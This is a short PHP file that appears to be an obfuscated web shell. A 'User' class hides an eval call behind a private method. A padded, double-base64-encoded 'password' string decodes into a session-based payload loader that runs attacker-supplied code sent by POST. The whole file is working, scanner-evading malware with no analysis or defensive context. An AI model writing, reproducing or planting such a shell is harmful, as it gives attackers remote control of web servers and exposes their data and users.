<?php
header('Content-Type:text/html;charset=utf-8');

class User {
  public function getprivateMethod() {
    return $this->privateMethod(...);
  }
  private function privateMethod($aes_decode) {
    return @eval($aes_decode);
  }
}
$user = new User;
$aes_decode =$user->getprivateMethod()('
$username = \'Io0HB5Rw\';
$password = \'UIo0HB5RwUIo0HB5RwhObGMzTnBiMjVmYzNSaGNIo0HB5RwuUW9LVHIo0HB5RwNLUUhObGRGOTBhVzFsWDJ4cGJXbDBLREFwT3dwQVpYSnliM0pmY21Wd2IzSjBhVzVuS0RBcE93cG1kVzVqZEdsdmJpQmxibU52WkdVb0pFUXNKIo0HB5RwRIo0HB5RwXNwZXdvZ0lDQWdabTl5S0NScFBUQTdKR2s4YzNSeWJHVnVLQ1JFSIo0HB5Rw1RzaIo0HB5Rw2FTc3JLU0I3Q2lBZ0lDQWdJQ0FnSkdNZ1BTQWtTMXNrYVNzeEpqRTFYVHNLSUNBZ0lDQWdJQ0FrUkZza2FWMGdQU0FrUkZza2FWMWVKR003Q2lBZ0lDIo0HB5RwQjlDaUFnSUNCeVpYUjFjbTRnSkVRN0NuMEtKSEJoYzNNOUozQmhjM01uT3dva2NHRjViRzloWkU1aGJXVTlKM0JoZVd4dllXUW5Pd29rYTJWNVBTY3pZelpsTUdJNFlUbGpNVFV5TWpSaEp6c0thV1lnS0dsemMyVjBLQ1JmVUU5VFZGc2tjR0Z6YzEwcEtYc0tJQ0FnSUNSa1lYUmhQV1Z1WTI5a1pTaGlZWE5sTmpSZlpHVmpiMlJsS0NSZlVFOVRWRnNrY0dGemMxMHBMQ1JyWlhrcE93b2dJQ0FnYVdZZ0tHbHpjMlYwS0NSZlUwVlRVMGxQVGxza2NHRjViRzloWkU1aGJXVmRLU2w3Q2lBZ0lDQWdJQ0FnSkhCaGVXeHZZV1E5Wlc1amIyUmxLQ1JmVTBWVFUwbFBUbHNrY0dGNWJHOWhaRTVoYldWZExDUnJaWGtwT3dvZ0lDQWdJQ0FnSUdsbUlDaHpkSEp3YjNNb0pIQmhlV3h2WVdRc0ltZGxkRUpoYzJsamMwbHVabThpS1QwOVBXWmhiSE5sS1hzS0lDQWdJQ0FnSUNBZ0lDQWdKSEJoZVd4dllXUTlaVzVqYjJSbEtDUndZWGxzYjJGa0xDUnJaWGtwT3dvZ0lDQWdJQ0FnSUgwS0NRbGxkbUZzS0NSd1lYbHNiMkZrS1RzS0lDQWdJQ0FnSUNCbFkyaHZJSE4xWW5OMGNpaHRaRFVvSkhCaGMzTXVKR3RsZVNrc01Dd3hOaWs3Q2lBZ0lDQWdJQ0FnWldOb2J5QmlZWE5sTmpSZlpXNWpiMlJsS0dWdVkyOWtaU2hBY25WdUtDUmtZWFJoS1N3a2EyVjVLU2s3Q2lBZ0lDQWdJQ0FnWldOb2J5QnpkV0p6ZEhJb2JXUTFLQ1J3WVhOekxpUnJaWGtwTERFMktUc0tJQ0FnSUgxbGJITmxld29nSUNBZ0lDQWdJR2xtSUNoemRISndiM01vSkdSaGRHRXNJbWRsZEVKaGMybGpjMGx1Wm04aUtTRTlQV1poYkhObEtYc0tJQ0FnSUNBZ0lDQWdJQ0FnSkY5VFJWTlRTVTlPV3lSd1lYbHNiMkZrVG1GdFpWMDlaVzVqYjJSbEtDUmtZWFJoTENSclpYa3BPd29nSUNBZ0lDQWdJSDBLSUNBZ0lIMEtmUT09\';
header(\'dddddd:\'.$username);
$arr = apache_response_headers();
$template_source=\'\';
foreach ($arr as $k => $v) {
    if ($k[0] == \'d\' && $k[4] == \'d\') {
        $template_source = str_replace($v,\'\',$password);
    }
}
$template_source = base64_decode($template_source);
$template_source = base64_decode($template_source);
$key = \'template_source\';
$aes_decode=$$key;
return $aes_decode;
');
$user->getprivateMethod()($aes_decode);